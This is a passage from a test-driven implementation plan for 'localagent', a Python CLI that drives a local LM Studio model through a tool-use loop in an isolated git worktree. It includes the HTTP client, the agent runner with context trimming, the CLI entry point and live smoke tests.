    if not git_dir.is_absolute():
        git_dir = repo / git_dir
    exclude = git_dir / "info" / "exclude"
    exclude.parent.mkdir(parents=True, exist_ok=True)
    existing = exclude.read_text() if exclude.exists() else ""
    if ".worktrees/" not in existing:
        with open(exclude, "a", encoding="utf-8") as fh:
            if existing and not existing.endswith("\n"):
                fh.write("\n")
            fh.write(".worktrees/\n")


def load_repo_context(repo: Path) -> str | None:
    for name in ("CLAUDE.md", "AGENTS.md"):
        p = repo / name
        if p.is_file():
            return p.read_text(encoding="utf-8", errors="replace")
    return None
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_workspace.py -v`
Expected: 8 PASS

- [ ] **Step 5: Commit**

```bash
git add localagent/workspace.py tests/test_workspace.py
git commit -m "feat: workspace preflight, slug, worktree lifecycle, repo context"
```

---

### Task 7: LM Studio HTTP client

**Files:**
- Create: `localagent/llm.py`
- Test: `tests/test_llm.py`

**Interfaces:**
- Consumes: nothing from other modules.
- Produces:
  - `class LLMError(Exception)`
  - `class LMStudioClient:` with `__init__(self, base_url: str = "http://localhost:1234/v1", timeout: int = 600)`, `list_models(self) -> list[str]` (model ids), and `chat(self, model: str, messages: list, tools: list, temperature: float | None = None, max_tokens: int = 4096) -> dict` (parsed full response body). Both raise `LLMError` on connection/HTTP/JSON failure. `temperature` is omitted from the payload when `None`.

- [ ] **Step 1: Write the failing test**

The test spins up a real `http.server` on a random localhost port so `urllib` code paths are genuinely exercised — no network stubbing libraries.

`tests/test_llm.py`:

```python
from __future__ import annotations

import json
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

import pytest

from localagent.llm import LLMError, LMStudioClient


class _FakeLMStudio(BaseHTTPRequestHandler):
    last_payload: dict = {}

    def do_GET(self):
        body = json.dumps({"data": [{"id": "m1"}, {"id": "m2"}]}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body)

    def do_POST(self):
        length = int(self.headers["Content-Length"])
        _FakeLMStudio.last_payload = json.loads(self.rfile.read(length))
        body = json.dumps({
            "choices": [{"message": {"role": "assistant", "content": "hi"}}],
            "usage": {"prompt_tokens": 1, "completion_tokens": 1},
        }).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):  # silence test output
        pass


@pytest.fixture()
def server():
    srv = HTTPServer(("127.0.0.1", 0), _FakeLMStudio)
    thread = threading.Thread(target=srv.serve_forever, daemon=True)
    thread.start()
    yield f"http://127.0.0.1:{srv.server_address[1]}/v1"
    srv.shutdown()


def test_list_models(server: str):
    client = LMStudioClient(base_url=server)
    assert client.list_models() == ["m1", "m2"]


def test_chat_payload_and_response(server: str):
    client = LMStudioClient(base_url=server)
    resp = client.chat("m1", [{"role": "user", "content": "x"}], tools=[])
    assert resp["choices"][0]["message"]["content"] == "hi"
    payload = _FakeLMStudio.last_payload
    assert payload["model"] == "m1"
    assert payload["max_tokens"] == 4096
    assert "temperature" not in payload  # omitted when None


def test_chat_temperature_included(server: str):
    client = LMStudioClient(base_url=server)
    client.chat("m1", [], tools=[], temperature=0.2)
    assert _FakeLMStudio.last_payload["temperature"] == 0.2


def test_connection_error_raises_llmerror():
    client = LMStudioClient(base_url="http://127.0.0.1:1/v1", timeout=2)
    with pytest.raises(LLMError):
        client.list_models()
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_llm.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'localagent.llm'`

- [ ] **Step 3: Write minimal implementation**

`localagent/llm.py`:

```python
from __future__ import annotations

import json
import urllib.error
import urllib.request


class LLMError(Exception):
    """Raised when the LM Studio server is unreachable or returns garbage."""


class LMStudioClient:
    def __init__(self, base_url: str = "http://localhost:1234/v1", timeout: int = 600):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout

    def _request(self, path: str, payload: dict | None = None) -> dict:
        url = f"{self.base_url}{path}"
        data = json.dumps(payload).encode() if payload is not None else None
        req = urllib.request.Request(
            url, data=data, headers={"Content-Type": "application/json"}
        )
        try:
            with urllib.request.urlopen(req, timeout=self.timeout) as resp:
                return json.loads(resp.read().decode())
        except urllib.error.HTTPError as e:
            raise LLMError(f"LM Studio HTTP {e.code} on {path}: {e.read()[:500]!r}")
        except (urllib.error.URLError, OSError) as e:
            raise LLMError(f"cannot reach LM Studio at {self.base_url}: {e}")
        except json.JSONDecodeError as e:
            raise LLMError(f"invalid JSON from LM Studio on {path}: {e}")

    def list_models(self) -> list[str]:
        body = self._request("/models")
        return [m["id"] for m in body.get("data", [])]

    def chat(
        self,
        model: str,
        messages: list,
        tools: list,
        temperature: float | None = None,
        max_tokens: int = 4096,
    ) -> dict:
        payload = {"model": model, "messages": messages, "max_tokens": max_tokens}
        if tools:
            payload["tools"] = tools
        if temperature is not None:
            payload["temperature"] = temperature
        return self._request("/chat/completions", payload)
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_llm.py -v`
Expected: 4 PASS

- [ ] **Step 5: Commit**

```bash
git add localagent/llm.py tests/test_llm.py
git commit -m "feat: stdlib HTTP client for LM Studio chat completions"
```

---

### Task 8: Runner — agent loop + context trimming

**Files:**
- Create: `localagent/runner.py`
- Test: `tests/test_runner.py`

**Interfaces:**
- Consumes: `ToolExecutor` (Task 5: `.execute(name, args) -> str`, raises `KeyError` on unknown tool), `Transcript` (Task 1), and any object with the `chat(model, messages, tools, temperature, max_tokens) -> dict` signature from Task 7 (tests inject a fake).
- Produces:
  - `CONTEXT_WINDOWS = {"qwen/qwen3-coder-next": 65536, "mistralai/devstral-small-2-2512": 32768}`, `DEFAULT_WINDOW = 32768`, `TRIM_MARKER = "[result trimmed — re-run the tool if needed]"`
  - `trim_messages(messages: list, char_budget: int) -> bool` — mutates in place: replaces oldest `role=="tool"` contents with `TRIM_MARKER` until total chars ≤ budget; returns whether it now fits.
  - `@dataclass class RunResult:` fields `status: str`, `turns: int`, `final_message: str`, `usage: dict`
  - `class Runner:` `__init__(self, client, executor, transcript, model, max_turns=40, timeout=1800, temperature=None)`; `run(self, system_prompt: str, task: str) -> RunResult`. Statuses produced here: `completed`, `max_turns`, `timeout`, `context_exhausted`, `model_error`, `interrupted` (on KeyboardInterrupt).

- [ ] **Step 1: Write the failing test**

`tests/test_runner.py`:

```python
from __future__ import annotations

import json
from pathlib import Path

import pytest

from localagent.runner import (
    DEFAULT_WINDOW,
    TRIM_MARKER,
    RunResult,
    Runner,
    trim_messages,
)
from localagent.tools import ToolExecutor
from localagent.transcript import Transcript


def _resp(content=None, tool_calls=None, usage=None):
    msg = {"role": "assistant", "content": content}
    if tool_calls:
        msg["tool_calls"] = tool_calls
    return {"choices": [{"message": msg}],
            "usage": usage or {"prompt_tokens": 10, "completion_tokens": 5}}


def _call(call_id, name, args: dict):
    return {"id": call_id, "type": "function",
            "function": {"name": name, "arguments": json.dumps(args)}}


class FakeClient:
    def __init__(self, responses):
        self.responses = list(responses)
        self.requests = []

    def chat(self, model, messages, tools, temperature=None, max_tokens=4096):
        self.requests.append([json.loads(json.dumps(m)) for m in messages])
        return self.responses.pop(0)


@pytest.fixture()
def parts(tmp_path: Path):
    wt = tmp_path / "wt"
    wt.mkdir()
    (wt / "f.txt").write_text("data\n")
    transcript = Transcript(tmp_path / "t.jsonl")
    executor = ToolExecutor(wt, transcript=transcript)
    return wt, executor, transcript, tmp_path


def _events(tmp_path: Path):
    return [json.loads(l) for l in (tmp_path / "t.jsonl").read_text().splitlines()]


def test_two_turn_run(parts):
    wt, executor, transcript, tmp = parts
    client = FakeClient([
        _resp(tool_calls=[_call("c1", "read_file", {"path": "f.txt"})]),
        _resp(content="Done: file says data"),
    ])
    r = Runner(client, executor, transcript, model="qwen/qwen3-coder-next")
    result = r.run("sysprompt", "read the file")
    transcript.close()

    assert result.status == "completed"
    assert result.turns == 2
    assert "Done" in result.final_message
    assert result.usage == {"prompt_tokens": 20, "completion_tokens": 10}

    # second request must include the tool result message with matching id
    second = client.requests[1]
    tool_msgs = [m for m in second if m["role"] == "tool"]
    assert tool_msgs and tool_msgs[0]["tool_call_id"] == "c1"
    assert "data" in tool_msgs[0]["content"]

    kinds = [e["event"] for e in _events(tmp)]
    assert kinds[0] == "run_start" and kinds[-1] == "run_end"
    assert "assistant" in kinds and "tool_result" in kinds


def test_max_turns(parts):
    wt, executor, transcript, tmp = parts
    loop_resp = _resp(tool_calls=[_call("c", "list_dir", {"path": "."})])
    client = FakeClient([loop_resp] * 3)
    r = Runner(client, executor, transcript, model="m", max_turns=3)
    result = r.run("s", "t")
    transcript.close()
    assert result.status == "max_turns"
    assert result.turns == 3


def test_malformed_args_three_strikes(parts):
    wt, executor, transcript, tmp = parts
    bad = _resp(tool_calls=[{"id": "x", "type": "function",
                             "function": {"name": "read_file", "arguments": "{not json"}}])
    client = FakeClient([bad, bad, bad])
    r = Runner(client, executor, transcript, model="m")
    result = r.run("s", "t")
    transcript.close()
    assert result.status == "model_error"


def test_unknown_tool_counts_as_strike_but_recovers(parts):
    wt, executor, transcript, tmp = parts
    client = FakeClient([
        _resp(tool_calls=[_call("c1", "no_such_tool", {})]),
        _resp(content="ok done"),
    ])
    r = Runner(client, executor, transcript, model="m")
    result = r.run("s", "t")
    transcript.close()
    assert result.status == "completed"
    # the model got an error message back as the tool result
    second = client.requests[1]
    tool_msgs = [m for m in second if m["role"] == "tool"]
    assert "unknown tool" in tool_msgs[0]["content"].lower()


def test_trim_messages():
    msgs = [
        {"role": "system", "content": "s" * 100},
        {"role": "tool", "tool_call_id": "1", "content": "x" * 1000},
        {"role": "assistant", "content": "a" * 100},
        {"role": "tool", "tool_call_id": "2", "content": "y" * 1000},
    ]
    fits = trim_messages(msgs, char_budget=1300)
    assert fits
    assert msgs[1]["content"] == TRIM_MARKER      # oldest trimmed first
    assert msgs[3]["content"] == "y" * 1000        # newer kept
    assert msgs[0]["content"] == "s" * 100         # system never trimmed


def test_trim_cannot_fit():
    msgs = [{"role": "system", "content": "s" * 5000}]
    assert trim_messages(msgs, char_budget=100) is False
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_runner.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'localagent.runner'`

- [ ] **Step 3: Write minimal implementation**

`localagent/runner.py`:

```python
from __future__ import annotations

import json
import time
from dataclasses import dataclass, field

CONTEXT_WINDOWS = {
    "qwen/qwen3-coder-next": 65536,
    "mistralai/devstral-small-2-2512": 32768,
}
DEFAULT_WINDOW = 32768
TRIM_MARKER = "[result trimmed — re-run the tool if needed]"
CHARS_PER_TOKEN = 4
BUDGET_FRACTION = 0.75
MAX_CONSECUTIVE_FAILURES = 3


def _total_chars(messages: list) -> int:
    return sum(len(m.get("content") or "") for m in messages)


def trim_messages(messages: list, char_budget: int) -> bool:
    """Replace oldest tool results with TRIM_MARKER until under budget."""
    for m in messages:
        if _total_chars(messages) <= char_budget:
            return True
        if m.get("role") == "tool" and m.get("content") != TRIM_MARKER:
            m["content"] = TRIM_MARKER
    return _total_chars(messages) <= char_budget


@dataclass
class RunResult:
    status: str
    turns: int
    final_message: str
    usage: dict = field(default_factory=dict)


class Runner:
    def __init__(self, client, executor, transcript, model,
                 max_turns: int = 40, timeout: int = 1800,
                 temperature: float | None = None):
        self.client = client
        self.executor = executor
        self.transcript = transcript
        self.model = model
        self.max_turns = max_turns
        self.timeout = timeout
        self.temperature = temperature
        window = CONTEXT_WINDOWS.get(model, DEFAULT_WINDOW)
        self.char_budget = int(window * BUDGET_FRACTION * CHARS_PER_TOKEN)

    def run(self, system_prompt: str, task: str) -> RunResult:
        from .tools import TOOL_SCHEMAS

        messages = [
            {"role": "system", "content": system_prompt},
            {"role": "user", "content": task},
        ]
        self.transcript.write("run_start", task=task, model=self.model,
                              max_turns=self.max_turns, timeout=self.timeout)
        usage = {"prompt_tokens": 0, "completion_tokens": 0}
        turns = 0
        failures = 0
        start = time.monotonic()

        def finish(status: str, final: str) -> RunResult:
            self.transcript.write("run_end", status=status, turns=turns,
                                  duration_s=round(time.monotonic() - start, 1),
                                  usage=usage)
            return RunResult(status, turns, final, usage)

        try:
            while True:
                if turns >= self.max_turns:
                    return finish("max_turns", "")
                if time.monotonic() - start > self.timeout:
                    return finish("timeout", "")
                if not trim_messages(messages, self.char_budget):
                    return finish("context_exhausted", "")

                resp = self.client.chat(self.model, messages, tools=TOOL_SCHEMAS,
                                        temperature=self.temperature)
                turns += 1
                for k in usage:
                    usage[k] += resp.get("usage", {}).get(k, 0)
                msg = resp["choices"][0]["message"]
                tool_calls = msg.get("tool_calls") or []
                self.transcript.write(
                    "assistant", text=msg.get("content"),
                    tool_calls=[{"name": tc["function"]["name"],
                                 "arguments": tc["function"]["arguments"]}
                                for tc in tool_calls])
                messages.append(msg)

                if not tool_calls:
                    return finish("completed", msg.get("content") or "")

                for tc in tool_calls:
                    name = tc["function"]["name"]
                    call_id = tc.get("id", "")
                    try:
                        args = json.loads(tc["function"]["arguments"] or "{}")
                        if not isinstance(args, dict):
                            raise ValueError("arguments must be a JSON object")
                        result = self.executor.execute(name, args)
                        failures = 0
                    except (json.JSONDecodeError, ValueError) as e:
                        failures += 1
                        result = f"ERROR: malformed tool arguments: {e}"
                    except KeyError:
                        failures += 1
                        result = (f"ERROR: unknown tool '{name}'. Available: read_file, "
                                  f"write_file, edit_file, list_dir, grep, bash.")
                    except TypeError as e:
                        failures += 1
                        result = f"ERROR: bad arguments for {name}: {e}"
                    self.transcript.write("tool_result", tool=name,
                                          args=tc["function"]["arguments"][:500],
                                          result=result[:2000])
                    messages.append({"role": "tool", "tool_call_id": call_id,
                                     "content": result})
                    if failures >= MAX_CONSECUTIVE_FAILURES:
                        return finish("model_error",
                                      "aborted after repeated malformed tool calls")
        except KeyboardInterrupt:
            return finish("interrupted", "")
```

- [ ] **Step 4: Run test to verify it passes**

Run: `python3 -m pytest tests/test_runner.py -v` then `python3 -m pytest`
Expected: all PASS, no regressions

- [ ] **Step 5: Commit**

```bash
git add localagent/runner.py tests/test_runner.py
git commit -m "feat: agent loop with context trimming and failure bounds"
```

---

### Task 9: CLI entry point + install + README

**Files:**
- Create: `localagent/__main__.py`, `bin/localagent`, `README.md`
- Test: `tests/test_main.py`

**Interfaces:**
- Consumes: everything above — `preflight_repo`, `make_slug`, `create_worktree`, `ensure_worktrees_excluded`, `load_repo_context` (Task 6); `LMStudioClient`, `LLMError` (Task 7); `ToolExecutor` (Task 5); `Transcript` (Task 1); `Runner`, `RunResult` (Task 8).
- Produces: `main(argv: list | None = None) -> int` in `__main__.py` (argparse `run` subcommand); `build_system_prompt(worktree: Path, repo_context: str | None) -> str`; executable `bin/localagent` wrapper; `RUNS_DIR = Path.home() / ".localagent" / "runs"`.

- [ ] **Step 1: Write the failing test**

`tests/test_main.py`:

```python
from __future__ import annotations

import json
from pathlib import Path

import pytest

from localagent.__main__ import build_system_prompt, main


def test_build_system_prompt_includes_rules_and_context(tmp_path: Path):
    p = build_system_prompt(tmp_path, "REPO RULES HERE")
    assert str(tmp_path) in p
    assert "edit_file" in p
    assert "REPO RULES HERE" in p
    assert "uncommitted" in p


def test_build_system_prompt_no_context(tmp_path: Path):
    p = build_system_prompt(tmp_path, None)
    assert "Repository conventions" not in p


def test_main_bad_repo_exits_2(tmp_path: Path, capsys):
    rc = main(["run", "--repo", str(tmp_path / "nope"), "do things"])
    assert rc == 2
    assert "error" in capsys.readouterr().err.lower()


def test_main_lmstudio_down_exits_2(tmp_path: Path, capsys, monkeypatch):
    import subprocess
    repo = tmp_path / "r"
    repo.mkdir()
    subprocess.run(["git", "-C", str(repo), "init"], capture_output=True)
    subprocess.run(["git", "-C", str(repo), "-c", "user.email=t@t",
                    "-c", "user.name=t", "commit", "--allow-empty", "-m", "i"],
                   capture_output=True)
    rc = main(["run", "--repo", str(repo), "--base-url",
               "http://127.0.0.1:1/v1", "do things"])
    assert rc == 2
```

- [ ] **Step 2: Run test to verify it fails**

Run: `python3 -m pytest tests/test_main.py -v`
Expected: FAIL — `ModuleNotFoundError` / `ImportError` on `localagent.__main__`

- [ ] **Step 3: Write the implementation**

`localagent/__main__.py`:

```python
from __future__ import annotations

import argparse
import json
import sys
from datetime import datetime
from pathlib import Path

from .llm import LLMError, LMStudioClient
from .runner import Runner
from .tools import ToolExecutor
from .transcript import Transcript
from .workspace import (
    WorkspaceError,
    create_worktree,
    ensure_worktrees_excluded,
    load_repo_context,
    make_slug,
    preflight_repo,
)

RUNS_DIR = Path.home() / ".localagent" / "runs"
DEFAULT_MODEL = "qwen/qwen3-coder-next"


def build_system_prompt(worktree: Path, repo_context: str | None) -> str:
    prompt = f"""You are a coding agent working in a git worktree at {worktree}.
Complete the task, then reply with a plain-text summary of what you changed and \
what commands you ran.

Rules:
- Use edit_file or write_file for ALL file changes. Never modify files via bash \
(no sed -i, no echo redirects, no heredocs).
- Paths are relative to the worktree root.
- Explore before editing: use list_dir, grep, and read_file to understand the \
code first.
- Verify your work: run the repo's tests or build via bash before declaring the \
task complete.
- Do not run git commit or git branch commands; leave all changes uncommitted \
for review.
- When the task is complete, reply WITHOUT calling any tools — that final plain \
reply ends the run."""
    if repo_context:
        prompt += f"\n\nRepository conventions (from the repo's own docs):\n\n{repo_context}"
    return prompt


def _err(msg: str) -> None:
    print(f"error: {msg}", file=sys.stderr)


def main(argv: list | None = None) -> int:
    parser = argparse.ArgumentParser(prog="localagent")
    sub = parser.add_subparsers(dest="cmd", required=True)
    run_p = sub.add_parser("run", help="run one task in an isolated worktree")
    run_p.add_argument("task")
    run_p.add_argument("--repo", required=True, type=Path)
    run_p.add_argument("--model", default=DEFAULT_MODEL)
    run_p.add_argument("--branch-from", default=None)
    run_p.add_argument("--max-turns", type=int, default=40)
    run_p.add_argument("--timeout", type=int, default=1800)
    run_p.add_argument("--temperature", type=float, default=None)
    run_p.add_argument("--base-url", default="http://localhost:1234/v1")
    args = parser.parse_args(argv)

    repo = args.repo.expanduser().resolve()

    # ---- preflight (exit 2, create nothing) ----
    client = LMStudioClient(base_url=args.base_url)
    try:
        preflight_repo(repo)
        models = client.list_models()
    except WorkspaceError as e:
        _err(str(e))
        return 2
    except LLMError as e:
        _err(f"{e}\nIs LM Studio running? Try: lms ps")
        return 2
    if args.model not in models:
        _err(f"model '{args.model}' not loaded (loaded: {', '.join(models) or 'none'}). "
             f"Load it with: lms load {args.model}")
        return 2

    # ---- workspace ----
    slug = make_slug(args.task, datetime.now())
    try:
        ensure_worktrees_excluded(repo)
        worktree = create_worktree(repo, slug, args.branch_from)
    except WorkspaceError as e:
        _err(str(e))
        return 2

    transcript = Transcript(RUNS_DIR / slug / "transcript.jsonl")
    print(f"transcript: {transcript.path}", file=sys.stderr)
    print(f"worktree:   {worktree}", file=sys.stderr)

    # ---- run ----
    executor = ToolExecutor(worktree, transcript=transcript)
    runner = Runner(client, executor, transcript, model=args.model,
                    max_turns=args.max_turns, timeout=args.timeout,
                    temperature=args.temperature)
    system_prompt = build_system_prompt(worktree, load_repo_context(repo))
    try:
        result = runner.run(system_prompt, args.task)
    except LLMError as e:
        transcript.write("run_end", status="model_error", error=str(e))
        transcript.close()
        _err(str(e))
        return 1
    transcript.close()

    print(json.dumps({
        "status": result.status,
        "worktree": str(worktree),
        "branch": f"localagent/{slug}",
        "transcript": str(transcript.path),
        "turns": result.turns,
        "usage": result.usage,
        "final_message": result.final_message,
    }, indent=2))
    return 0 if result.status == "completed" else 1


if __name__ == "__main__":
    sys.exit(main())
```

`bin/localagent`:

```bash
#!/bin/bash
exec env PYTHONPATH="$HOME/repos/localagent" python3 -m localagent "$@"
```

`README.md`:

```markdown
# localagent

Runs one coding task against a local LM Studio model in an agentic tool-use
loop, inside an isolated git worktree. Built to be driven by Claude Code;
humans watch with `tail -f`.

## Install

    chmod +x bin/localagent
    ln -sf ~/repos/localagent/bin/localagent ~/.local/bin/localagent

## Use

    localagent run --repo ~/repos/someproject "Add a unit test for X"

Watch a run: `tail -f` the transcript path printed on stderr.
Review a run: `git -C <worktree> diff`, then commit or discard.
Discard a run: `git -C <repo> worktree remove --force <worktree> &&
git -C <repo> branch -D localagent/<slug>`

Design: docs/superpowers/specs/2026-08-13-localagent-design.md
```

- [ ] **Step 4: Run tests, then install and verify the CLI end-to-end (no LLM needed)**

```bash
python3 -m pytest -v                       # all green
chmod +x bin/localagent
ln -sf ~/repos/localagent/bin/localagent ~/.local/bin/localagent
localagent run --repo /nonexistent "x"; echo "exit=$?"   # expect: error + exit=2
```

Expected: full suite PASS; the CLI prints a repo error and exits 2.

- [ ] **Step 5: Commit**

```bash
git add localagent/__main__.py bin/localagent README.md tests/test_main.py
git commit -m "feat: CLI entry point, launcher script, README"
```

---

### Task 10: Live smoke test against real LM Studio

**Files:**
- Create: `tests/test_live.py`
- Modify: `docs/superpowers/specs/2026-08-13-localagent-design.md` (record devstral verification result)

**Interfaces:**
- Consumes: the installed `localagent` CLI and `LMStudioClient`.

- [ ] **Step 1: Write the live tests**

`tests/test_live.py`:

```python
from __future__ import annotations

import json
import subprocess
from pathlib import Path

import pytest

from localagent.llm import LLMError, LMStudioClient

QWEN = "qwen/qwen3-coder-next"
DEVSTRAL = "mistralai/devstral-small-2-2512"

PROBE_TOOL = [{"type": "function", "function": {
    "name": "list_dir",
    "description": "List files in a directory",
    "parameters": {"type": "object",
                   "properties": {"path": {"type": "string"}},
                   "required": ["path"]}}}]


def _server_up() -> bool:
    try:
        LMStudioClient(timeout=5).list_models()
        return True
    except LLMError:
        return False


pytestmark = [pytest.mark.live,
              pytest.mark.skipif(not _server_up(), reason="LM Studio not running")]


@pytest.mark.parametrize("model", [QWEN, DEVSTRAL])
def test_model_emits_tool_calls(model):
    """Devstral tool-calling was unverified at design time — this settles it."""
    client = LMStudioClient()
    resp = client.chat(model,
                       [{"role": "user", "content": "What files are in src?"}],
                       tools=PROBE_TOOL, max_tokens=200, temperature=0)
    msg = resp["choices"][0]["message"]
    calls = msg.get("tool_calls") or []
    assert calls, f"{model} returned no tool_calls: {msg.get('content')!r:.200}"
    assert calls[0]["function"]["name"] == "list_dir"


def test_end_to_end_run(tmp_path: Path):
    """Full CLI run against a throwaway repo: create file via the agent."""
    repo = tmp_path / "demo"
    repo.mkdir()
    for cmd in (["init", "-b", "main"],
                ["config", "user.email", "t@t"], ["config", "user.name", "t"]):
        subprocess.run(["git", "-C", str(repo), *cmd], check=True,
                       capture_output=True)
    (repo / "README.md").write_text("# demo\n")
    subprocess.run(["git", "-C", str(repo), "add", "."], check=True)
    subprocess.run(["git", "-C", str(repo), "commit", "-m", "init"],
                   check=True, capture_output=True)

    res = subprocess.run(
        ["localagent", "run", "--repo", str(repo), "--max-turns", "10",
         "Create a file named hello.txt containing exactly the word: hello"],
        capture_output=True, text=True, timeout=600)
    assert res.returncode == 0, res.stderr
    out = json.loads(res.stdout)
    assert out["status"] == "completed"
    created = Path(out["worktree"]) / "hello.txt"
    assert created.exists() and "hello" in created.read_text()
```

- [ ] **Step 2: Run the live suite**

Run: `python3 -m pytest -m live -v`
Expected: PASS with LM Studio running. If `test_model_emits_tool_calls[mistralai/devstral-small-2-2512]` FAILS, that is a *finding*, not a defect in this task: keep the test, mark it `xfail` with reason "devstral template does not emit OpenAI tool_calls", and proceed.

- [ ] **Step 3: Record the devstral verdict in the spec**

Edit `docs/superpowers/specs/2026-08-13-localagent-design.md`, replacing the sentence "**Devstral tool-calling is not yet verified — verify during implementation before documenting it as supported.**" with one of:
- "Devstral tool-calling verified working on 2026-08-14 (live smoke test)."
- "Devstral does NOT emit OpenAI tool_calls (verified 2026-08-14); qwen is the only supported model until this changes. The `--model` flag still accepts it for experimentation."

- [ ] **Step 4: Run the full suite one last time**

Run: `python3 -m pytest -v && python3 -m pytest -m live -v`
Expected: everything green (or the documented xfail).

- [ ] **Step 5: Commit**

```bash
git add tests/test_live.py docs/superpowers/specs/2026-08-13-localagent-design.md
git commit -m "test: live smoke tests incl. devstral tool-calling verdict"
```
